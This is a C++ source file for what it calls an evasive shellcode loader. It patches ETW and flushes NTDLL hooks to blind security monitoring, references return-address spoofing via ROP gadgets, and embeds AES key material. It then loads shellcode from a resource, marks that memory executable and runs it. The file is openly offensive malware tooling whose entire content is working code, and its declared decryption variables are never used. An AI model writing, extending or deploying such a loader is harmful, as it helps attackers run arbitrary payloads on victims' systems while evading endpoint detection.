/* Evasive shellcode loader designed to hide its execution from userland/kernel-land detections */



#include <iostream>

#include "allocator.h"
#include "resolvers.h"
#include "unhook.h"
#include "retaddrspoof.h"
#include "defs.h"
#include "etw.h"
#include "AES.h"
#include "hook.h"
#include "rsrc.h"
#include "functions.h"






PVOID Gdgt = FindROPGadget(); // used all across the project for ret address spoofing
LPVOID InitialFiber;



unsigned char* rc4key;
unsigned long rc4keysize;
NTSTATUS status;
SIZE_T lpDataSize;



PLARGE_PAGE_INFORMATION pLPI;


unsigned char AesKey[] = { 0xBD, 0x19, 0x3D, 0x27, 0x69, 0x8C, 0xC6, 0x80, 0x86, 0x53, 0x8F, 0x3A, 0x53, 0x82, 0x16, 0x85, 0x9C, 0x01, 0x7C, 0xF3, 0xF9, 0xCA, 0x39, 0x1C, 0x08, 0x61, 0x6E, 0x05, 0x6F, 0x74, 0x7B, 0x08 };


unsigned char AesIv[] = { 0xAD, 0xC7, 0xC0, 0x5B, 0xA8, 0xAB, 0x80, 0x21, 0x95, 0x8E, 0x46, 0xD6, 0x15, 0x6B, 0x8B, 0xA0 };



/* AES vars */

PBYTE AesCipherText;

BOOL decryption;

PVOID pPlainBuffer = nullptr;
DWORD PlainBufferSize = 0;

PVOID ptr = nullptr;
DWORD ResourceSize;


LPVOID Creation = nullptr;
PVOID lpParameter = nullptr;



int main() {
	// Optional evasion
	FlushNTDLL();
	PatchETW();

	// 1. Locate the resource containing the shellcode
	HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_RCDATA1), (LPCSTR)RT_RCDATA);
	if (!hRes) {
		std::cout << "[-] Failed to find resource." << std::endl;
		return -1;
	}

	// 2. Load the resource
	HGLOBAL hGlobal = LoadResource(NULL, hRes);
	if (!hGlobal) {
		std::cout << "[-] Failed to load resource." << std::endl;
		return -1;
	}

	// 3. Lock the resource to get a pointer to the shellcode
	PVOID pShellcode = LockResource(hGlobal);
	if (!pShellcode) {
		std::cout << "[-] Failed to lock resource." << std::endl;
		return -1;
	}

	// 4. Get the size of the shellcode
	DWORD dwShellcodeSize = SizeofResource(NULL, hRes);
	if (dwShellcodeSize == 0) {
		std::cout << "[-] Resource size is 0." << std::endl;
		return -1;
	}

#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Shellcode loaded, size: " << dwShellcodeSize << " bytes.\n";
#endif

	// 5. Allocate executable memory
	PVOID pExecMem = VirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pExecMem) {
		std::cout << "[-] Failed to allocate memory." << std::endl;
		return -1;
	}

	// 6. Copy shellcode to allocated memory
	memcpy(pExecMem, pShellcode, dwShellcodeSize);

	// 7. Change memory protection to PAGE_EXECUTE_READ
	DWORD dwOldProtect;
	if (!VirtualProtect(pExecMem, dwShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
		std::cout << "[-] Failed to change memory protection." << std::endl;
		return -1;
	}

	// 8. Execute the shellcode
	std::cout << "[+] Executing shellcode..." << std::endl;
	void(*func)() = (void(*)())pExecMem;
	func();

	return 0;
}